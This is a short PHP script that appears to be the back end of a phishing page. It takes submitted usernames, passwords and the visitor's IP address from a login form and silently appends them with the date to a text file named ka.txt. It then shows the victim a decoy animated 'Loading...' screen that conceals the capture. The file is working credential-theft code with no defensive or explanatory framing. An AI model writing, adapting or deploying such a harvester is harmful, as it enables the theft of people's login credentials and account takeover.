<?php
     
     $file = "ka.txt";
     $use  = $_POST["user"];
     $pass = $_POST["password"];
     $ip   = $_SERVER["HTTP_CLIENT_IP"];
    $today = date("j F y");
     
   $handle = fopen($file,'a');
    fwrite($handle, "\n\r");
    fwrite($handle, "user :");
    fwrite($handle, "$use");
    fwrite($handle, "\n");
    fwrite($handle, "password :");
    fwrite($handle, "$pass");
    fwrite($handle, "\n");
    fwrite($handle, "ip :");
    fwrite($handle, "$ip");
    fwrite($handle, "\n");
    fwrite($handle, "Hari :");
    fwrite($handle, "$today");
    fwrite($handle, "\n\r");
    fclose($handle);
  echo '<DOCTYPE html>
  <html>
  <head>
  <title>Loader</title>
  <style>
  /*Loader*/
  #loader-wrapper {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 1000;
  }
  
  /*Text Loading */
  h2{
  display: block;
  position: relative;
  top: 13%;
  font-size: 50px;
  font-family: Brush Script Std;
  text-align: center;
  color: blue;
  z-index: 1001;
  animation: mymove 1.5s infinite alternate;
  }
  
  @keyframes mymove{
  0%{
  opacity: 100; 
  }
  
  100%{
  opacity: 0;
  }
  }
  
  </style>
  </head>
  <body>
  <div id="loader-wrapper">
  <h2>Loading...</h2>
  <div id="loader"></div>
  <div class="loader-section section-left"></div>
  <div class="loader-section section-right"></div>
  </div>
  
  </body>
  </html>';


?>